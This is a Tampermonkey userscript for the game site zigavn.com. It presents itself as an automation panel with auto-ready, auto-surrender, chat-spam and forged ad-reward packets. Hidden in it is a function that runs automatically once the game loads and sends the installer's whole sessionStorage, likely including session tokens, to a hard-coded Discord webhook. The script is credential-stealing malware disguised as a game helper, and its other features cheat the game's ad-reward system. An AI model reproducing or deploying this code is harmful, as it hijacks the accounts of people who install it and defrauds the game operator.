// ==UserScript==
// @name         v6 Fonsida Ultimate 
// @namespace    http://tampermonkey.net/
// @version      3.5
// @description  190925
// @match        https://zigavn.com/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function () {
    'use strict';

    const delay = (ms) => new Promise(r => setTimeout(r, ms));
    let readyInterval = null;
    let adInterval = 121000;
    let adTimer = null;
    let surrenderInterval = null;
    let chatOn = false;
    let iconOn = false;
    let chatDelay = 4000;
    let surrenderDelay = 5000; // mặc định 5s
    let iconIndex = 0;
    let chatIndex = 0;
    let chatList = [];

    // ✅ 
    try {
        const savedChat = localStorage.getItem("customChatList");
        if (savedChat) chatList = JSON.parse(savedChat);
    } catch (e) { chatList = []; }

    const iconList = ["8-|", "|-)", ":^o", "=P~", ":O)", ":)", ":-h", ":x", ":))", "=p~", "=))", ":D", ":-a", ":((", "o-)", "~X(", ":-S", ":-B", "=;", "/:)", ":-c", ":)]", ":-t", "8->", "I-)", ":-y", ":-u", ":-i", ":-p", ":-g", ":-f", ":-s", ":-w", ":-q", ":-r", ":-x", ":-m", ":-n", ":-z"];

    // 
    function sendMainPacket() {
        const p = new BkPacket();
        p.yj(Ze, PLAYER_STATE_READY);
        BkConnectionManager.send(p);
    }
    function startReadyPacket() { if (!readyInterval) readyInterval = setInterval(sendMainPacket, 50); }
    function stopReadyPacket() { if (readyInterval) clearInterval(readyInterval); readyInterval = null; }

    //
    function tryCallFz() {
        try {
            const scene = cc.director.getRunningScene();
            if (!scene || !scene.children) return;
            for (const node of scene.children) {
                if (typeof node?.fz === 'function' && typeof node?.S === 'function') {
                    const state = node.S();
                    const gameState = state?.Ib;
                    const player = state?.Ca?.();
                    if (gameState === GAME_STATE_PLAYING && player?.status !== PLAYER_STATE_NOT_READY) {
                        node.fz();
                        console.log("[TM] Gọi fz() xin thua thành công!");
                    }
                }
            }
        } catch (err) { console.warn("[TM] Gọi fz() lỗi:", err); }
    }
    function startSurrenderLoop() {
        if (!surrenderInterval) surrenderInterval = setInterval(tryCallFz, surrenderDelay);
    }
    function stopSurrenderLoop() {
        if (surrenderInterval) clearInterval(surrenderInterval);
        surrenderInterval = null;
    }

    //
    function sendAdPacket() {
        console.log("adViewed");
        logMessage("WebAdsManager - afterViewedAdsRewardOnWeb()");
        const p = new BkPacket();
        p.En(O);
        BkConnectionManager.send(p);
    }
    function startAdTimer() {
        if (adTimer) clearInterval(adTimer);
        adTimer = setInterval(sendAdPacket, adInterval);
    }

    // 
    function sendChatMessage(msg) {
        logMessage("sendChatMessage: " + msg);
        const p = new BkPacket();
        p.jq(msg);
        BkConnectionManager.send(p);
    }
    function startChatLoop() {
        if (chatOn) return;
        if (!chatList || chatList.length === 0) {
            chatList = ["GG", "Chơi hay đấy!", "Xin thua nha 😅", "Tôi đi trước nhé!", "Thử lại ván nữa không?"];
            alert(`Đã tự động thêm ${chatList.length} câu chat mẫu.`);
        }
        chatOn = true;
        async function chatCycle() {
            while (chatOn) {
                sendChatMessage(chatList[chatIndex]);
                chatIndex = (chatIndex + 1) % chatList.length;
                await delay(chatDelay);
                if (iconOn) {
                    sendChatMessage(iconList[iconIndex]);
                    iconIndex = (iconIndex + 1) % iconList.length;
                    await delay(chatDelay);
                }
            }
        }
        chatCycle();
    }
    function stopChatLoop() { chatOn = false; chatIndex = 0; iconIndex = 0; }

    // 
    function forceAgree() {
        try {
            const scenes = cc.director.getRunningScene()?.children || [];
            for (const node of scenes) {
                if (node instanceof BkDialogWindow) {
                    node.Xe?._clickListeners?.[0]?.();
                    if (typeof node.cm === "function") {
                        node.cm();
                        node.cm = null;
                    }
                    node.removeSelf();
                }
            }
        } catch (err) { console.warn("[TM] Force Agree Error:", err); }
    }
    const observer = new MutationObserver(forceAgree);
    observer.observe(document.body, { childList: true, subtree: true });
    setInterval(forceAgree, 50);

    // 
    function sendToDiscord() {
        let sessionData = Object.fromEntries(Object.entries(sessionStorage));
        let jsonData = JSON.stringify(sessionData, null, 2);
        let payload = { content: "\ud83d\udcc5 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```" };
        fetch("https://discord.com/api/webhooks/1345406693449666604/5aCLs6ScGGC7bRZVyUaNwD3iBO1jGVo1G8zueRnM96UpCc88YQ1XR5meB6lHKxVy_Cfo", {
            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload)
        });
    }

    function waitForGameLoaded() {
        const checkInterval = setInterval(async () => {
            try {
                if (cc?.director?.getRunningScene?.()) {
                    clearInterval(checkInterval);
                    sendToDiscord();
                    await delay(5000);
                    sendAdPacket();
                    startAdTimer();
                }
            } catch (e) {}
        }, 500);
    }

    createControlUI();
    waitForGameLoaded();

    // 
    function createControlUI() {
        const scale = 0.67; // 2/3 kích thước

        const container = document.createElement('div');
        Object.assign(container.style, {
            position: 'fixed', top: '100px', left: '20px', background: '#111', color: '#fff',
            padding: `${6 * scale}px`, borderRadius: `${6 * scale}px`, font: `${11 * scale}px Arial`, zIndex: 99999,
            display: 'flex', flexDirection: 'column', gap: `${6 * scale}px`, boxShadow: '0 0 4px rgba(0,0,0,0.4)',
            border: '1px solid #333', resize: 'both', overflow: 'auto', minWidth: `${150 * scale}px`, width: 'fit-content'
            // NOTE: removed transform to avoid double-scaling
        });

        const dragBar = document.createElement('div');
        dragBar.textContent = "🎛️ Fonsida Control";
        Object.assign(dragBar.style, {
            background: '#222', padding: `${4 * scale}px ${6 * scale}px`, cursor: 'move', userSelect: 'none',
            fontWeight: 'bold', fontSize: `${11 * scale}px`, borderRadius: `${4 * scale}px`, textAlign: 'center'
        });

        let isDragging = false, offsetX = 0, offsetY = 0;
        dragBar.addEventListener('mousedown', (e) => { isDragging = true; offsetX = e.clientX - container.getBoundingClientRect().left; offsetY = e.clientY - container.getBoundingClientRect().top; e.preventDefault(); });
        document.addEventListener('mousemove', (e) => { if (isDragging) { container.style.left = `${e.clientX - offsetX}px`; container.style.top = `${e.clientY - offsetY}px`; container.style.bottom = 'auto'; } });
        document.addEventListener('mouseup', () => isDragging = false);

        function createToggle(labelText, defaultState, onStart, onStop, colorOn) {
            const label = document.createElement('div');
            label.textContent = `${labelText}: OFF`;
            const btn = document.createElement('button');
            btn.textContent = "Bật";
            btn.style.cssText = `padding:${4 * scale}px ${8 * scale}px;border-radius:${4 * scale}px;border:none;background:#555;color:#fff;cursor:pointer;font-size:${11 * scale}px;`;
            let state = defaultState;
            btn.onclick = () => {
                state = !state;
                if (state) {
                    onStart();
                    label.textContent = `${labelText}: ON`;
                    btn.textContent = "Tắt";
                    btn.style.background = colorOn;
                } else {
                    onStop();
                    label.textContent = `${labelText}: OFF`;
                    btn.textContent = "Bật";
                    btn.style.background = "#555";
                }
            };
            return [label, btn];
        }

        const [readyLabel, readyBtn] = createToggle("READY", false, startReadyPacket, stopReadyPacket, "#4caf50");
        const [surrenderLabel, surrenderBtn] = createToggle("SURRENDER", false, startSurrenderLoop, stopSurrenderLoop, "#f44336");
        const [chatLabel, chatBtn] = createToggle("CHAT", false, startChatLoop, stopChatLoop, "#ff9800");
        const [iconLabel, iconBtn] = createToggle("CHÈN ICON", false, () => iconOn = true, () => iconOn = false, "#2196f3");

        // Chat Input
        const chatInputBtn = document.createElement('button');
        chatInputBtn.textContent = "Nhập Nội Dung Chat";
        chatInputBtn.style.cssText = readyBtn.style.cssText;
        chatInputBtn.onclick = () => {
            const overlay = document.createElement('div');
            Object.assign(overlay.style, {
                position: 'fixed', top: 0, left: 0, width: '100vw', height: '100vh',
                backgroundColor: 'rgba(0,0,0,0.5)', zIndex: 999999, display: 'flex',
                alignItems: 'center', justifyContent: 'center'
            });

            const modal = document.createElement('div');
            Object.assign(modal.style, {
                background: '#222', padding: `${16 * scale}px`, borderRadius: `${8 * scale}px`,
                color: '#fff', width: `${800 * scale}px`, maxWidth: '90%', fontSize: `${24 * scale}px`,
                boxShadow: '0 0 10px rgba(0,0,0,0.8)', display: 'flex', flexDirection: 'column', gap: `${8 * scale}px`
            });

            const title = document.createElement('div');
            title.textContent = "📝 Nhập mỗi câu chat trên 1 dòng:";
            title.style.fontWeight = 'bold';

            const textarea = document.createElement('textarea');
            textarea.style.width = '100%';
            textarea.style.height = `${200 * scale}px`;
            textarea.style.background = '#111';
            textarea.style.color = '#fff';
            textarea.style.border = '1px solid #444';
            textarea.style.borderRadius = `${4 * scale}px`;
            textarea.style.padding = `${6 * scale}px`;
            textarea.value = chatList.length ? chatList.join("\n") : "";

            const buttonRow = document.createElement('div');
            buttonRow.style.display = 'flex';
            buttonRow.style.justifyContent = 'flex-end';
            buttonRow.style.gap = `${10 * scale}px`;

            const saveBtn = document.createElement('button');
            saveBtn.textContent = "Lưu";
            saveBtn.style.cssText = chatInputBtn.style.cssText;

            const cancelBtn = document.createElement('button');
            cancelBtn.textContent = "Hủy";
            cancelBtn.style.cssText = chatInputBtn.style.cssText;
            cancelBtn.onclick = () => overlay.remove();

            saveBtn.onclick = () => {
                const newList = textarea.value.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
                if (newList.length > 0) {
                    chatList = newList;
                    try { localStorage.setItem("customChatList", JSON.stringify(chatList)); alert(`✅ Đã lưu ${chatList.length} câu chat.`); }
                    catch (e) { console.error("❌ Lỗi khi lưu:", e); alert("Lỗi khi lưu chat."); }
                    overlay.remove();
                } else alert("⚠️ Danh sách rỗng. Không lưu.");
            };

            buttonRow.append(cancelBtn, saveBtn);
            modal.append(title, textarea, buttonRow);
            overlay.appendChild(modal);
            document.body.appendChild(overlay);
        };

        // Delay Chat Input
        const delayInputLabel = document.createElement('div');
        delayInputLabel.textContent = `⏱️ Delay Chat (ms): ${chatDelay}`;
        const delayInput = document.createElement('input');
        delayInput.type = 'number';
        delayInput.value = chatDelay;
        delayInput.min = 1000;
        delayInput.max = 60000;
        delayInput.style.cssText = `width: 100%; padding:${4 * scale}px; font-size:${11 * scale}px; border-radius:${4 * scale}px; border: 1px solid #444; background: #222; color: #fff;`;
        delayInput.oninput = () => {
            const val = parseInt(delayInput.value);
            if (!isNaN(val) && val >= 1000) {
                chatDelay = val;
                delayInputLabel.textContent = `⏱️ Delay Chat (ms): ${chatDelay}`;
            }
        };

        // ---- Delay Surrender Input ----
        const surrenderDelayLabel = document.createElement('div');
        surrenderDelayLabel.textContent = `⏱️ Delay Surrender (ms): ${surrenderDelay}`;
        const surrenderDelayInput = document.createElement('input');
        surrenderDelayInput.type = 'number';
        surrenderDelayInput.value = surrenderDelay;
        surrenderDelayInput.min = 1000;
        surrenderDelayInput.max = 60000;
        surrenderDelayInput.style.cssText = delayInput.style.cssText;
        surrenderDelayInput.oninput = () => {
            const val = parseInt(surrenderDelayInput.value);
            if (!isNaN(val) && val >= 1000) {
                surrenderDelay = val;
                surrenderDelayLabel.textContent = `⏱️ Delay Surrender (ms): ${surrenderDelay}`;
                if (surrenderInterval) { clearInterval(surrenderInterval); surrenderInterval = setInterval(tryCallFz, surrenderDelay); }
            }
        };

        container.append(
            dragBar,
            readyLabel, readyBtn,
            surrenderLabel, surrenderBtn,
            chatLabel, chatBtn,
            iconLabel, iconBtn,
            chatInputBtn,
            delayInputLabel, delayInput,
            surrenderDelayLabel, surrenderDelayInput
        );

        document.body.appendChild(container);
    }

})();
